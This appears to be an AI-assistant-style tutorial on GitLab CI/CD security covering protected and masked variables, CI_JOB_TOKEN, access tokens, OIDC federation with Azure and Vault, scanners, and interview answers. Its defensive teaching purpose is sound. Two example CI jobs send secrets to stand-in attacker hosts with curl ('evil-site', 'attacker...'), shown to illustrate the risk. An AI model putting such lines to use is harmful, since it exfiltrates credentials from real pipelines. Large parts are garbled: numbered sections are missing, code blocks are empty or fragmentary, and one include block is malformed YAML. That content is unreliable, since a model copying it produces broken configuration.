# Security, Identity & Enterprise GitLab CI/CD

This is the final core topic.

For a senior DevOps/Platform Engineer, I’d organize GitLab CI/CD security into this model:

```text
                    CI/CD SECURITY

       ┌─────────────────────────────────┐
       │ 1. Pipeline configuration       │
       │    inputs / policies / rules    │
       └─────────────────────────────────┘

       ┌─────────────────────────────────┐
       │ 2. Secrets                      │
       │    Variables / Vault / KeyVault │
       └─────────────────────────────────┘

       ┌─────────────────────────────────┐
       │ 3. Identity                     │
       │    CI_JOB_TOKEN / OIDC          │
       └─────────────────────────────────┘

       ┌─────────────────────────────────┐
       │ 4. Execution security           │
       │    runners / refs / permissions │
       └─────────────────────────────────┘

       ┌─────────────────────────────────┐
       │ 5. Application security         │
       │    SAST / deps / image / secret │
       └─────────────────────────────────┘

       ┌─────────────────────────────────┐
       │ 6. Central governance           │
       │    Pipeline Execution Policies  │
       └─────────────────────────────────┘
```

The most important principle is:

> **Prefer short-lived identities over stored credentials.**

---

## 1. Start with CI/CD variables

You already saw:

```yaml
variables:
  ENVIRONMENT: dev
```

That's fine for configuration.

But for sensitive values, don't do this:

```yaml
variables:
  AZURE_CLIENT_SECRET: "123456"
  HARBOR_PASSWORD: "password"
```

especially not committed into Git.

Sensitive variables should at minimum be stored through GitLab's CI/CD settings, and GitLab supports:

```text
Masked
Masked + Hidden
Protected
Environment-scoped
File type
```

As of current GitLab, new project/group variables default to **Masked** visibility. GitLab also explicitly says CI/CD variables are less secure than dedicated secret-management providers and recommends external secret storage for sensitive values. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

---

### 2. Masked variable

Suppose:

```text
HARBOR_PASSWORD=SuperSecret123
```

If it's masked and the job does:

```yaml
script:
  - echo "$HARBOR_PASSWORD"
```

the log should show something like:

```text
[MASKED]
```

rather than the value.

But here's the important point:

> **Masked does not mean secure from malicious pipeline code.**

For example, code could potentially deliberately send the secret elsewhere.

GitLab explicitly warns that masking cannot protect a secret from malicious scripts; pipeline changes still need proper review. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

Therefore:

```text
masked
≠
permission boundary
```

It is mainly protection against accidental log exposure.

---

### 3. Hidden variable

Current GitLab also supports:

```text
Masked and hidden
```

After creating it, the value cannot simply be revealed again through the GitLab UI.

Think:

```text
Masked
   ↓
protect job logs

Hidden
   ↓
protect UI disclosure
```

For a stored sensitive GitLab variable, I would usually consider:

```text
Masked
+
Hidden
+
Protected
```

where appropriate. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

---

### 4. Protected variable

Example:

```text
PROD_TOKEN
```

configured as:

```text
Protected = true
```

It becomes available only to eligible pipelines on protected branches/tags.

Conceptually:

```text
PROD_TOKEN

main protected       ✅
v2.1 protected tag   ✅

feature/login        ❌
random branch        ❌
```

This is extremely important.

Otherwise a developer could create:

```yaml
steal-secret:
  script:
    - curl evil-site/?token=$PROD_TOKEN
```

on their own feature branch.

Protected variables drastically reduce this exposure boundary. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

---

## 5. Environment-scoped variables

Take it further:

```text
AZURE_DEV_CLIENT_ID
scope: development

AZURE_PROD_CLIENT_ID
scope: production
```

Now production-related values are associated only with appropriate deployment environments.

So you can create boundaries across:

```text
branch/ref
+
environment
```

That's much better than:

```text
One giant group variable
available everywhere
```

GitLab supports environment scopes on CI/CD variables directly. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

# 6. File variables

Sometimes a tool expects:

```text
certificate file
kubeconfig
JSON credential file
```

instead of:

```text
environment variable string
```

GitLab variables support a `File` type.

Conceptually:

```text
GitLab secret
     ↓
temporary file
     ↓
variable contains path

$MY_CERT
=
/tmp/gitlab_variable_xyz
```

Then:

```yaml
script:
  - curl --cacert "$MY_CERT" https://internal-api
```

This is much cleaner than embedding multiline PEM content directly into commands.

# 7. But the better architecture is often external secrets

For serious enterprise workloads:

```text
GitLab Variables
```

shouldn't necessarily become your company password vault.

Better:

```text
Azure Key Vault
HashiCorp Vault
AWS Secrets Manager
GitLab Secrets Manager
...
```

GitLab supports the `secrets:` keyword and external secret providers, including Azure Key Vault integration. ([GitLab Docs](https://docs.gitlab.com/ci/yaml/?utm_source=chatgpt.com "CI/CD YAML syntax reference | GitLab Docs"))

Conceptually:

```text
GitLab Job
    │
    │ authenticates
    ▼
Secret Manager
    │
    │ retrieves only required secret
    ▼
Job
```

rather than:

```text
secret copied permanently
into GitLab variable
```

# 8. Now identity: `CI_JOB_TOKEN`

This is probably the most important GitLab-specific security token.

Every running job receives:

```bash
$CI_JOB_TOKEN
```

GitLab creates it automatically.

Its important properties:

```text
short-lived
automatically generated
valid only while job runs
limited GitLab API access
associated with the triggering user's permissions
```

When the job ends:

```text
token revoked
```

GitLab specifically recommends CI job tokens instead of personal access tokens when the required GitLab operation is supported. ([GitLab Docs](https://docs.gitlab.com/ci/jobs/ci_job_token/?utm_source=chatgpt.com "CI/CD job token | GitLab Docs"))

---

# 9. Why `CI_JOB_TOKEN` is better than a PAT

Bad old design:

```text
Create PAT
    ↓
store as CI variable
    ↓
token valid 90/365 days
    ↓
every pipeline uses it
```

If leaked:

```text
attacker may use it later
```

Better:

```text
Job starts
   ↓
CI_JOB_TOKEN generated
   ↓
job uses token
   ↓
job ends
   ↓
token invalid
```

This dramatically reduces credential lifetime.

---

# 10. What can `CI_JOB_TOKEN` do?

It's intentionally more restricted than a normal Personal Access Token.

You can use it for supported GitLab operations such as accessing certain:

```text
repositories
packages
container-related resources
artifacts
releases
pipeline/job endpoints
```

but it does **not** expose the entire GitLab API.

Think:

```text
CI_JOB_TOKEN
=
CI service identity
with constrained GitLab capabilities
```

not:

```text
temporary admin PAT
```

GitLab explicitly describes it as having fewer available resources/endpoints than a personal access token. ([GitLab Docs](https://docs.gitlab.com/ci/jobs/ci_job_token/?utm_source=chatgpt.com "CI/CD job token | GitLab Docs"))

---

# 11. Cross-project `CI_JOB_TOKEN`

Remember Topic 5:

```text
Project B pipeline
      ↓
needs artifact from
      ↓
Project A
```

By default, Project A doesn't necessarily trust jobs from Project B.

Project A can configure:

```text
Job Token Permissions
        ↓
Allowlist
        ↓
Project B
```

Architecture:

```text
Project A
artifact
  ▲
  │
  │ CI_JOB_TOKEN
  │
Project B pipeline
```

For access to succeed:

```text
B must be allowlisted by A
+
the user behind the job must have sufficient permissions
```

GitLab's current default allowlist contains only the project itself until additional projects/groups are allowed. ([GitLab Docs](https://docs.gitlab.com/ci/jobs/ci_job_token/?utm_source=chatgpt.com "CI/CD job token | GitLab Docs"))

This is a very strong security control.

---

# 12. Group allowlist

You can also allow:

```text
platform/*
```

instead of adding projects one by one.

For example:

```text
deployment-project
allows:

apps/payment
apps/orders
apps/customer
```

or potentially:

```text
apps group
```

Be careful:

```text
allow group
```

means current and future projects under that group/subgroups can match the allowlist.

So:

```text
group allowlisting
=
larger blast radius
```

Use it deliberately. ([GitLab Docs](https://docs.gitlab.com/ci/jobs/ci_job_token/?utm_source=chatgpt.com "CI/CD job token | GitLab Docs"))

---

# 13. Git push using `CI_JOB_TOKEN`

A newer capability worth knowing: GitLab can allow CI job tokens to push to repositories, including cross-project pushes from appropriately allowlisted projects when configured.

This is useful for patterns such as:

```text
application pipeline
      ↓
update deployment repository
      ↓
GitOps
```

without storing a permanent Git token.

GitLab made cross-project CI job-token push generally available in 19.1. A push made this way does not itself trigger a new pipeline in the target project. ([GitLab Docs](https://docs.gitlab.com/ci/jobs/ci_job_token/?utm_source=chatgpt.com "CI/CD job token | GitLab Docs"))

That's potentially very useful for GitOps workflows.

# 14. Token hierarchy

You should know the main GitLab token types:

|Token|Best use|
|---|---|
|`CI_JOB_TOKEN`|CI accessing GitLab|
|Project Access Token|persistent automation for one project|
|Group Access Token|persistent automation across a group|
|Deploy Token|repository/package/container read/write deployment access|
|Personal Access Token|user automation|
|Runner Authentication Token|Runner ↔ GitLab|
|Agent Token|Kubernetes agent ↔ GitLab|

For CI, GitLab's own security guidance is essentially:

```text
CI_JOB_TOKEN
   ↓ if insufficient
Project Access Token
   ↓ if truly needed
Group-level/service identity

Avoid PAT where possible.
```

([GitLab Docs](https://docs.gitlab.com/security/tokens/?utm_source=chatgpt.com "GitLab token overview | GitLab Docs"))

---

# 15. Project Access Token

Suppose an automation genuinely needs more GitLab API functionality than `CI_JOB_TOKEN` provides.

Instead of:

```text
Hady personal PAT
```

use:

```text
payment-api project access token
```

Why?

Blast radius.

```text
PAT
   ↓
everything user can access

Project Access Token
   ↓
payment-api only
```

GitLab project access tokens create a bot identity and are scoped to the specific project. ([GitLab Docs](https://docs.gitlab.com/user/project/settings/project_access_tokens/?utm_source=chatgpt.com "Project access tokens | GitLab Docs"))

---

# 16. Group Access Token

Similarly:

```text
Platform Group Token
```

can access resources in:

```text
platform/
  runners
  templates
  components
  deployment
```

Useful sometimes.

But it has a considerably larger blast radius.

GitLab's own internal token guidance labels group-token use as something to treat carefully because it covers the whole group/subgroups. ([GitLab Docs](https://docs.gitlab.com/development/access_tokens_for_gitlab_project/?utm_source=chatgpt.com "Access tokens for the GitLab project | GitLab Docs"))

So don't do:

```text
one group token
stored everywhere
```

unless there's a very strong reason.

---

# 17. Deploy Token

Deploy tokens are useful when an external system needs:

```text
Git repository
Container Registry
Package Registry
```

without using a human identity.

For example:

```text
Kubernetes / external CD system
      ↓
read container image
      ↓
GitLab Container Registry
```

or another automation consuming packages.

They are not general GitLab API tokens. ([GitLab Docs](https://docs.gitlab.com/user/project/deploy_tokens/?utm_source=chatgpt.com "Deploy tokens | GitLab Docs"))

# 18. PAT should usually be your last option in CI

Bad:

```yaml
variables:
  GITLAB_TOKEN: glpat-xxxxxxxx
```

especially if that PAT belongs to an employee.

Problems:

```text
employee leaves
token expires
permissions change
large scope
harder audit trail
credential rotation
```

GitLab explicitly recommends CI job tokens over PATs for pipeline use where possible. ([GitLab Docs](https://docs.gitlab.com/security/tokens/?utm_source=chatgpt.com "GitLab token overview | GitLab Docs"))

# 19. Now the most important modern concept: OIDC

Suppose GitLab must deploy to Azure.

Traditional architecture:

```text
GitLab
   │
   │ AZURE_CLIENT_SECRET
   ▼
Azure
```

You store:

```text
AZURE_CLIENT_ID
AZURE_CLIENT_SECRET
AZURE_TENANT_ID
```

Secret might live for:

```text
6 months
1 year
2 years
```

This is no longer my preferred architecture.

Instead:

```text
GitLab job
    │
    │ short-lived OIDC JWT
    ▼
Microsoft Entra ID
    │
    │ validates identity
    ▼
temporary Azure authentication
```

GitLab officially supports OIDC ID tokens for Azure, AWS, GCP, Vault and other OIDC-compatible services. The older `CI_JOB_JWT` / `CI_JOB_JWT_V2` mechanism was removed in GitLab 17.0. ([GitLab Docs](https://docs.gitlab.com/ci/cloud_services/?utm_source=chatgpt.com "Connect to cloud services | GitLab Docs"))

---

# 20. `id_tokens:`

GitLab syntax:

```yaml
deploy:
  id_tokens:

    AZURE_OIDC_TOKEN:
      aud: https://gitlab.company.com

  script:
    - echo "authenticate"
```

GitLab generates:

```text
$AZURE_OIDC_TOKEN
```

as a signed JWT.

The `aud` value specifies the token's intended audience and is validated by the destination system. ([GitLab Docs](https://docs.gitlab.com/ci/yaml/?utm_source=chatgpt.com "CI/CD YAML syntax reference | GitLab Docs"))

---

# 21. What is inside the JWT?

Conceptually:

```json
{
  "iss": "https://gitlab.company.com",
  "sub": "project_path:apps/payment:ref_type:branch:ref:main",
  "aud": "...",
  "exp": "...",
  ...
}
```

The important part isn't memorizing every claim.

Understand this:

```text
GitLab cryptographically says:

"This job belongs to:
 project X
 branch Y
 pipeline Z
 user/context ..."

Cloud provider verifies GitLab's signature.
```

So no static password is required.

---

# 22. Azure federation example

For Azure:

```yaml
azure-auth:

  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.company.com

  script:

    - >
      az login
      --service-principal
      --username "$AZURE_CLIENT_ID"
      --tenant "$AZURE_TENANT_ID"
      --federated-token "$GITLAB_OIDC_TOKEN"

    - az account show
```

The Entra application/federated credential is configured to trust specific GitLab identity claims.

GitLab's documented Azure flow uses `az login --service-principal ... --federated-token`. ([GitLab Docs](https://docs.gitlab.com/ci/cloud_services/azure/?utm_source=chatgpt.com "Configure OpenID Connect in Azure to retrieve temporary credentials | GitLab Docs"))

---

# 23. Why this is much better

Old:

```text
CLIENT_SECRET
      │
      ├── stored
      ├── rotated
      ├── might leak
      └── long lived
```

OIDC:

```text
Job starts
   ↓
GitLab issues JWT
   ↓
Azure validates JWT
   ↓
short-lived authentication
   ↓
job finishes
```

No stored Azure client secret.

That's the key.

---

# 24. Azure identity can be branch-specific

This is where it becomes really powerful.

You can configure Azure trust for:

```text
project:
apps/payment

branch:
main
```

Meaning:

```text
payment/main
     ↓
Azure production identity ✅

payment/feature-x
     ↓
Azure production identity ❌
```

GitLab's Azure documentation explicitly shows branch/ref information being included in the subject identifier used for federated credentials. ([GitLab Docs](https://docs.gitlab.com/ci/cloud_services/azure/?utm_source=chatgpt.com "Configure OpenID Connect in Azure to retrieve temporary credentials | GitLab Docs"))

That's much better than relying only on:

```text
"secret exists on main"
```

because Azure independently verifies the GitLab workload identity.

```text
     │

AWS STS
```

# 26. HashiCorp Vault

Similar:

```text
GitLab Job
     │
     │ ID token
     ▼
Vault
     │
validate GitLab identity
     │
     ▼
return secret
```

You can generate multiple ID tokens with different audiences:

```yaml
id_tokens:

  AZURE_TOKEN:
    aud: https://azure.example

  VAULT_TOKEN:
    aud: https://vault.company.com
```

This prevents one OIDC token from automatically being valid everywhere. GitLab explicitly recommends audience restrictions to reduce the impact of token compromise. ([GitLab Docs](https://docs.gitlab.com/ci/secrets/id_token_authentication/?utm_source=chatgpt.com "OpenID Connect (OIDC) Authentication Using ID Tokens | GitLab Docs"))

# 27. OIDC vs `CI_JOB_TOKEN`

Don't confuse them.

```text
CI_JOB_TOKEN
    ↓
authenticate TO GITLAB


OIDC ID TOKEN
    ↓
authenticate GitLab workload
TO EXTERNAL SYSTEM
```

This distinction is fundamental.

For example:

```text
Download artifact from another GitLab project
        ↓
CI_JOB_TOKEN


Login to Azure
        ↓
OIDC ID token


Retrieve Vault secret
        ↓
OIDC ID token
```

---

# 28. Secrets architecture I recommend

For production:

```text
Non-sensitive config
       ↓
spec:inputs / variables


GitLab-to-GitLab CI operations
       ↓
CI_JOB_TOKEN


Cloud login
       ↓
OIDC federation


Runtime secrets
       ↓
Key Vault / Vault / secret manager


Persistent GitLab automation
       ↓
Project access token only if necessary
```

This is the architecture you should aim for.

# 30. SAST

Basic GitLab example:

```yaml
include:
  - template: Jobs/SAST.gitlab-ci.yml
```

GitLab detects applicable analyzers based on the source code and outputs GitLab security reports.

SAST reports are uploaded as JSON artifacts which GitLab can interpret rather than treating them as arbitrary files. ([GitLab Docs](https://docs.gitlab.com/user/application_security/sast/?utm_source=chatgpt.com "Static application security testing (SAST) | GitLab Docs"))

Conceptually:

```text
Java source
    ↓
SAST analyzer
    ↓
security JSON
    ↓
GitLab
    ↓
Vulnerability / MR security UI
```

# 34. Secret Detection

```text

password patterns
```

Example:

```yaml
include:
  - template: Jobs/Secret-Detection.gitlab-ci.yml
```

Very important distinction:

```text

        ↓

        ↓

```

Prevention is obviously better.

```yaml
include:

  AST_ENABLE_MR_PIPELINES: "true"
```

# 37. Don't copy GitLab's scanner YAML

Avoid:

```text
copy 500 lines from GitLab SAST template
into our repo
```

Then GitLab improves the template and you never receive the changes.

Instead:

```yaml
include:
  - template: Jobs/SAST.gitlab-ci.yml
```

and override only what you intentionally need.

GitLab's security configuration guidance explicitly recommends including scanner templates instead of copying their contents. ([GitLab Docs](https://docs.gitlab.com/user/application_security/detect/security_configuration/?utm_source=chatgpt.com "Security configuration | GitLab Docs"))

```text

```

```text
Security organization says:

```

```text
component
=
```

# 46. Fork/MR security

This is a dangerous area.

Imagine:

```text
untrusted fork
      ↓
Merge Request
      ↓
pipeline
      ↓
production secrets
```

Obviously dangerous.

By default, fork pipelines don't automatically receive the parent project's CI/CD variables.

But if a fork MR pipeline is deliberately run in the **parent project**, GitLab warns that the parent project's variables become available to that pipeline. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

Therefore:

> Review pipeline changes from untrusted contributors before running privileged pipelines.

Especially if they modify:

```text
.gitlab-ci.yml
scripts/
Dockerfile
build scripts
```

# 47. CI code is privileged code

This is one of the most important security lessons.

Developers often review:

```text
Java source
```

carefully but ignore:

```yaml
.gitlab-ci.yml
```

That's backwards.

CI code can potentially access:

```text
secrets
registry
cloud credentials
artifacts
deployment permissions
source code
```

Therefore changes like:

```yaml

  - curl -d "$SECRET" https://attacker...
```

must be treated like privileged infrastructure changes.

GitLab explicitly highlights malicious CI scripts as a reason masking alone cannot protect secrets. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

# 52. Interview: `CI_JOB_TOKEN` vs PAT

A strong answer:

> "`CI_JOB_TOKEN` is an automatically issued short-lived token available only for the lifetime of a CI job and supports a restricted set of GitLab resources. I prefer it for pipeline-to-GitLab authentication because it doesn't require storing a long-lived credential. A personal access token is tied to a user and generally has a much larger persistence and blast radius, so I avoid PATs in CI when a job or project token can satisfy the requirement."

Excellent answer. ([GitLab Docs](https://docs.gitlab.com/ci/jobs/ci_job_token/?utm_source=chatgpt.com "CI/CD job token | GitLab Docs"))

---

# 53. Interview: OIDC vs client secret

Strong answer:

> "With a client secret, GitLab stores a long-lived credential that must be protected and rotated. With OIDC federation, GitLab issues a short-lived signed ID token for the job, and the cloud provider trusts specific GitLab claims such as project and ref. The job exchanges that identity for temporary access, so there is no long-lived cloud secret stored in GitLab."

That's exactly what I'd expect from a Senior DevOps engineer. ([GitLab Docs](https://docs.gitlab.com/ci/cloud_services/?utm_source=chatgpt.com "Connect to cloud services | GitLab Docs"))

---

# 54. Interview: masked vs protected variable

Answer:

> "Masking primarily prevents accidental disclosure in job logs. Protection controls availability by restricting the variable to eligible pipelines on protected branches or tags. A masked value can still be deliberately exfiltrated by malicious CI code, so I use protected refs, review controls, short-lived identity, and external secret managers rather than relying on masking alone."

Excellent. ([GitLab Docs](https://docs.gitlab.com/ci/variables/?utm_source=chatgpt.com "CI/CD variables | GitLab Docs"))

---

# 55. Interview: component vs Pipeline Execution Policy

Answer:

> "A CI/CD component is a reusable capability that projects choose to consume. A Pipeline Execution Policy is an organizational enforcement mechanism that can inject or enforce CI/CD jobs independently of the application's own configuration. I use components for standardization and policies for mandatory security or compliance controls."

Excellent senior-level distinction. ([GitLab Docs](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/?utm_source=chatgpt.com "Pipeline execution policies | GitLab Docs"))
